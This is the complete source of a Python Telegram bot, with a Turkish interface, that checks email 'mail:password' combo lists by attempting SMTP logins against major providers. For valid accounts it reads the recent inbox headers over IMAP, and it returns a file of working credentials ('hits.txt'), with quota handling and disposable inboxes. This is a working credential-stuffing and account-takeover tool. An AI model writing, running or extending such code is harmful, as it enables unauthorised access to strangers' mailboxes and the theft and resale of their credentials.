"""Mail Checker Bot — tek dosya, webhook modu (Render/Koyeb uyumlu)."""
import asyncio
import datetime as dt
import html
import logging
import os
import re
import secrets
import string
from collections import Counter

import aiosmtplib
import aiosqlite
import dns.asyncresolver
import httpx
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import BufferedInputFile, CallbackQuery, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web

logging.basicConfig(level=logging.INFO)

TOKEN = os.environ["BOT_TOKEN"]
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").replace(" ", "").split(",") if x.isdigit()}
FREE_LIMIT = int(os.getenv("FREE_DAILY_LIMIT", "50"))
CONC = int(os.getenv("CONCURRENCY", "10"))
SMTP_TIMEOUT = int(os.getenv("SMTP_TIMEOUT", "12"))
BASE_URL = (os.getenv("WEBHOOK_URL") or os.getenv("RENDER_EXTERNAL_URL") or "").rstrip("/")
PORT = int(os.getenv("PORT", "8080"))
WEBHOOK_PATH = "/webhook"
DB_PATH = os.getenv("DB_PATH", "data/bot.db")
MAX_LINES = 300

EMAIL_RE = re.compile(r"^[^@\s:]+@[^@\s:]+\.[a-zA-Z]{2,}$")
KNOWN = {
    "gmail.com": ("smtp.gmail.com", 587, "imap.gmail.com"),
    "googlemail.com": ("smtp.gmail.com", 587, "imap.gmail.com"),
    "outlook.com": ("smtp-mail.outlook.com", 587, "outlook.office365.com"),
    "hotmail.com": ("smtp-mail.outlook.com", 587, "outlook.office365.com"),
    "live.com": ("smtp-mail.outlook.com", 587, "outlook.office365.com"),
    "yahoo.com": ("smtp.mail.yahoo.com", 587, "imap.mail.yahoo.com"),
    "yandex.com": ("smtp.yandex.com", 465, "imap.yandex.com"),
    "mail.ru": ("smtp.mail.ru", 465, "imap.mail.ru"),
    "icloud.com": ("smtp.mail.me.com", 587, "imap.mail.me.com"),
}
STATUS = {
    "VALID": "✅ GEÇERLİ", "INVALID": "❌ GEÇERSİZ",
    "2FA": "🔐 2FA / uygulama şifresi gerekli", "NO_MX": "⚠️ Domain mail kabul etmiyor",
    "TIMEOUT": "⏱ Zaman aşımı", "BLOCKED": "🚫 Bağlantı reddedildi",
    "ERROR": "❓ Bilinmeyen hata",
}
SEM = asyncio.Semaphore(CONC)
BOXES: dict[int, "TempMail"] = {}


# ---------- yardımcılar ----------
def esc(t) -> str:
    return html.escape(str(t), quote=False)


def parse_line(line: str):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    for sep in (":", ";", "|", "\t"):
        if sep in line:
            email, _, pw = line.partition(sep)
            break
    else:
        parts = line.split(None, 1)
        if len(parts) != 2:
            return None
        email, pw = parts
    email, pw = email.strip(), pw.strip()
    return (email, pw) if EMAIL_RE.match(email) and pw else None


# ---------- veritabanı ----------
SCHEMA = """
CREATE TABLE IF NOT EXISTS users(user_id INTEGER PRIMARY KEY, day TEXT, used INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS notes(id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
  email TEXT, status TEXT, detail TEXT, created TEXT);
"""


def today() -> str:
    return dt.date.today().isoformat()


async def init_db() -> None:
    os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.executescript(SCHEMA)
        await db.commit()


async def touch_user(uid: int) -> None:
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR IGNORE INTO users(user_id, day, used) VALUES(?,?,0)", (uid, today()))
        await db.commit()


async def bump(uid: int) -> None:
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET used = CASE WHEN day = ? THEN used + 1 ELSE 1 END, day = ? WHERE user_id = ?",
            (today(), today(), uid))
        await db.commit()


async def left(uid: int) -> int:
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT day, used FROM users WHERE user_id = ?", (uid,)) as c:
            row = await c.fetchone()
    if not row or row[0] != today():
        return FREE_LIMIT
    return max(0, FREE_LIMIT - row[1])


async def note(uid: int, email: str, status: str, detail: str = "") -> None:
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT INTO notes(user_id, email, status, detail, created) VALUES(?,?,?,?,?)",
                         (uid, email, status, detail, dt.datetime.utcnow().isoformat()))
        await db.commit()


async def notes_of(uid: int, limit: int = 1000) -> list[tuple]:
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT email, status, detail FROM notes WHERE user_id = ? ORDER BY id DESC LIMIT ?",
                              (uid, limit)) as c:
            return await c.fetchall()


# ---------- smtp / imap ----------
async def resolve(domain: str):
    if domain in KNOWN:
        return KNOWN[domain][0], KNOWN[domain][1]
    try:
        r = dns.asyncresolver.Resolver()
        r.timeout = r.lifetime = 5
        ans = await r.resolve(domain, "MX")
        mx = sorted((x.preference, str(x.exchange).rstrip(".")) for x in ans)
        return (mx[0][1], 587) if mx else None
    except Exception:
        return None


async def check_account(email: str, pw: str):
    domain = email.rsplit("@", 1)[-1].lower()
    host_port = await resolve(domain)
    if not host_port:
        return "NO_MX", "MX kaydı yok"
    host, port = host_port
    try:
        async with aiosmtplib.SMTP(hostname=host, port=port, timeout=SMTP_TIMEOUT,
                                   start_tls=(port == 587)) as smtp:
            await smtp.login(email, pw)
            return "VALID", f"SMTP: {host}"
    except aiosmtplib.SMTPAuthenticationError as exc:
        t = str(exc).lower()
        if any(k in t for k in ("application-specific", "534", "2fa", "app password", "strong")):
            return "2FA", "Uygulama şifresi gerekiyor"
        return "INVALID", "Kimlik doğrulama reddedildi"
    except (aiosmtplib.SMTPConnectError, aiosmtplib.SMTPServerDisconnected):
        return "BLOCKED", f"{host} bağlanamadı"
    except asyncio.TimeoutError:
        return "TIMEOUT", host
    except Exception as exc:
        return "ERROR", str(exc)[:120]


async def read_inbox(email: str, pw: str, n: int = 5) -> list[str]:
    domain = email.rsplit("@", 1)[-1].lower()
    if domain not in KNOWN:
        return []
    host = KNOWN[domain][2]

    def run():
        import email as em
        import imaplib
        out = []
        box = imaplib.IMAP4_SSL(host, timeout=15)
        try:
            box.login(email, pw)
            box.select("INBOX", readonly=True)
            _, data = box.search(None, "ALL")
            for mid in data[0].split()[-n:][::-1]:
                _, raw = box.fetch(mid, "(RFC822.HEADER)")
                msg = em.message_from_bytes(raw[0][1])
                out.append(f"• {msg.get('Subject', '(konu yok)')} — {msg.get('From', '?')}")
        finally:
            try:
                box.logout()
            except Exception:
                pass
        return out

    return await asyncio.to_thread(run)


# ---------- geçici mail ----------
class TempMail:
    def __init__(self):
        self.token = None
        self.address = None

    async def create(self) -> str:
        async with httpx.AsyncClient(timeout=20) as c:
            dom = (await c.get("https://api.mail.tm/domains")).json()["hydra:member"][0]["domain"]
            user = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12))
            self.address, pw = f"{user}@{dom}", secrets.token_urlsafe(16)
            await c.post("https://api.mail.tm/accounts", json={"address": self.address, "password": pw})
            self.token = (await c.post("https://api.mail.tm/token",
                                       json={"address": self.address, "password": pw})).json()["token"]
        return self.address

    async def messages(self) -> list[dict]:
        async with httpx.AsyncClient(timeout=20) as c:
            r = await c.get("https://api.mail.tm/messages",
                            headers={"Authorization": f"Bearer {self.token}"})
            return r.json().get("hydra:member", []) if r.status_code == 200 else []

    async def body(self, mid: str) -> str:
        async with httpx.AsyncClient(timeout=20) as c:
            r = await c.get(f"https://api.mail.tm/messages/{mid}",
                            headers={"Authorization": f"Bearer {self.token}"})
            if r.status_code != 200:
                return ""
            d = r.json()
        return d.get("text") or (d.get("html") or [""])[0]


# ---------- klavyeler ----------
def menu():
    kb = InlineKeyboardBuilder()
    kb.button(text="📧 Tek mail kontrol", callback_data="single")
    kb.button(text="📄 Combo dosyası", callback_data="combo")
    kb.button(text="📥 Geçici kutu", callback_data="temp")
    kb.button(text="📝 Notlarım", callback_data="notes")
    kb.adjust(1, 2, 1)
    return kb.as_markup()


def back():
    kb = InlineKeyboardBuilder()
    kb.button(text="⬅️ Panele dön", callback_data="panel")
    return kb.as_markup()


router = Router()
WELCOME = ("<b>Mail Checker Bot</b>\n\nSMTP ile kimlik doğrulama dener, geçerli hesapların "
           "gelen kutusunu özetler, sonucu nota kaydeder.\n\n/mail tek · /combo dosya · "
           "/temp kutu · /notes notlar · /export yedek")


class Flow(StatesGroup):
    single = State()
    combo = State()


async def gate(m: Message) -> bool:
    uid = m.from_user.id
    await touch_user(uid)
    if uid in ADMIN_IDS:
        return True
    if await left(uid) <= 0:
        await m.answer("Günlük kotan doldu, yarın sıfırlanır.")
        return False
    return True


@router.message(CommandStart())
async def start(m: Message) -> None:
    await touch_user(m.from_user.id)
    q = "∞" if m.from_user.id in ADMIN_IDS else await left(m.from_user.id)
    await m.answer(f"{WELCOME}\n\nKalan kota: <b>{q}</b>", reply_markup=menu())


@router.message(Command("id"))
async def cid(m: Message) -> None:
    await m.answer(f"ID: <code>{m.from_user.id}</code>")


@router.callback_query(F.data == "panel")
async def panel(c: CallbackQuery) -> None:
    await c.message.edit_text("Panel:", reply_markup=menu())
    await c.answer()


@router.message(Command("mail"))
@router.callback_query(F.data == "single")
async def single_entry(ev, state: FSMContext) -> None:
    await state.set_state(Flow.single)
    txt = "Hesabı <code>mail:şifre</code> biçiminde gönder."
    if isinstance(ev, CallbackQuery):
        await ev.message.edit_text(txt, reply_markup=back())
        await ev.answer()
    else:
        await ev.answer(txt)


@router.message(StateFilter(Flow.single))
async def single_run(m: Message, state: FSMContext) -> None:
    p = parse_line(m.text or "")
    if not p:
        await m.answer("Ayrıştıramadım. <code>mail:şifre</code> olarak gönder.")
        return
    await state.clear()
    if not await gate(m):
        return
    email, pw = p
    await bump(m.from_user.id)
    msg = await m.answer("⏳ Deneniyor…")
    status, detail = await check_account(email, pw)
    inbox = []
    if status == "VALID":
        try:
            inbox = await read_inbox(email, pw)
        except Exception:
            pass
    await note(m.from_user.id, email, status, detail)
    txt = f"<b>{esc(email)}</b>\n{STATUS[status]}\n<code>{esc(detail)}</code>"
    if inbox:
        txt += "\n\n<b>Son mailler:</b>\n" + "\n".join(esc(i) for i in inbox)
    await msg.edit_text(txt, reply_markup=back())


@router.message(Command("combo"))
@router.callback_query(F.data == "combo")
async def combo_entry(ev, state: FSMContext) -> None:
    await state.set_state(Flow.combo)
    txt = f"<b>.txt</b> dosyası gönder — satır başına <code>mail:şifre</code> (en fazla {MAX_LINES})."
    if isinstance(ev, CallbackQuery):
        await ev.message.edit_text(txt, reply_markup=back())
        await ev.answer()
    else:
        await ev.answer(txt)


@router.message(StateFilter(Flow.combo), F.document)
async def combo_run(m: Message, state: FSMContext, bot: Bot) -> None:
    if not m.document.file_name.lower().endswith(".txt"):
        await m.answer("Sadece .txt.")
        return
    if not await gate(m):
        return
    raw = await bot.download(m.document)
    lines = [l for l in raw.read().decode("utf-8", "ignore").splitlines() if l.strip()]
    pairs = [p for p in (parse_line(l) for l in lines) if p]
    if not pairs:
        await m.answer("Geçerli satır yok.")
        return
    await state.clear()
    limit = len(pairs)
    if m.from_user.id not in ADMIN_IDS:
        limit = min(limit, await left(m.from_user.id))
    pairs = pairs[:min(limit, MAX_LINES)]
    limit = len(pairs)

    prog = await m.answer(f"⏳ 0/{limit} işlendi…")
    counts, hits, done = Counter(), [], 0

    async def work(email, pw):
        async with SEM:
            st, dt_ = await check_account(email, pw)
        await bump(m.from_user.id)
        counts[st] += 1
        await note(m.from_user.id, email, st, dt_)
        if st == "VALID":
            hits.append(f"{email}:{pw}")

    tasks = [asyncio.create_task(work(e, p)) for e, p in pairs]
    for fut in asyncio.as_completed(tasks):
        await fut
        done += 1
        if done % 10 == 0 or done == limit:
            try:
                await prog.edit_text(f"⏳ {done}/{limit} işlendi…")
            except Exception:
                pass

    await prog.edit_text(
        f"<b>Bitti — {limit} hesap</b>\n✅ Geçerli: <b>{counts['VALID']}</b>\n"
        f"🔐 2FA: {counts['2FA']} | ❌ Geçersiz: {counts['INVALID']}\n"
        f"⚠️ MX yok: {counts['NO_MX']} | ⏱ Timeout: {counts['TIMEOUT']} | 🚫 Engelli: {counts['BLOCKED']}",
        reply_markup=back())
    if hits:
        await m.answer_document(BufferedInputFile("\n".join(hits).encode(), "hits.txt"),
                                caption=f"{len(hits)} geçerli hesap")


@router.message(Command("temp"))
@router.callback_query(F.data == "temp")
async def temp_entry(ev) -> None:
    box = TempMail()
    addr = await box.create()
    BOXES[ev.from_user.id] = box
    txt = f"📥 Kutu hazır:\n<code>{esc(addr)}</code>\n\nAdresi kullan, sonra /oku ile gelenleri çek."
    if isinstance(ev, CallbackQuery):
        await ev.message.edit_text(txt, reply_markup=back())
        await ev.answer()
    else:
        await ev.answer(txt)


@router.message(Command("oku"))
async def temp_read(m: Message) -> None:
    box = BOXES.get(m.from_user.id)
    if not box:
        await m.answer("Önce /temp.")
        return
    msgs = await box.messages()
    if not msgs:
        await m.answer("Kutu boş, birkaç saniye sonra dene.")
        return
    for x in msgs[:3]:
        await m.answer(f"<b>{esc(x.get('subject') or '(konu yok)')}</b>\n"
                       f"<i>{esc(x.get('from', {}).get('address', '?'))}</i>\n\n"
                       f"{esc(await box.body(x['id']))[:2500]}")


@router.message(Command("notes"))
@router.callback_query(F.data == "notes")
async def show_notes(ev) -> None:
    rows = await notes_of(ev.from_user.id, 30)
    txt = ("<b>Son notlar</b>\n" + "\n".join(f"{STATUS.get(s, s)} <code>{esc(e)}</code>" for e, s, _ in rows)
           ) if rows else "Henüz not yok."
    if isinstance(ev, CallbackQuery):
        await ev.message.edit_text(txt, reply_markup=back())
        await ev.answer()
    else:
        await ev.answer(txt)


@router.message(Command("export"))
async def export(m: Message) -> None:
    rows = await notes_of(m.from_user.id)
    if not rows:
        await m.answer("Not yok.")
        return
    body = "\n".join(f"{e}:{s}:{d}" for e, s, d in rows)
    await m.answer_document(BufferedInputFile(body.encode(), "notlar.txt"), caption=f"{len(rows)} kayıt")


@router.message(Command("admin"))
async def admin(m: Message) -> None:
    if m.from_user.id not in ADMIN_IDS:
        await m.answer("Admin komutu.")
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT COUNT(*) FROM users") as c1:
            u = (await c1.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM notes") as c2:
            n = (await c2.fetchone())[0]
    await m.answer(f"Kullanıcı: {u}\nNot: {n}\nKota: {FREE_LIMIT}/gün")


# ---------- webhook sunucusu ----------
async def health(_request):
    return web.Response(text="ok")


async def main() -> None:
    if not BASE_URL:
        raise SystemExit("WEBHOOK_URL veya RENDER_EXTERNAL_URL tanımlı değil")
    await init_db()

    bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path=WEBHOOK_PATH)
    setup_application(app, dp, bot=bot)

    await bot.set_webhook(f"{BASE_URL}{WEBHOOK_PATH}", drop_pending_updates=True)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()
    logging.info("bot ayakta: %s", BASE_URL)
    await asyncio.Event().wait()


if __name__ == "__main__":
    asyncio.run(main())
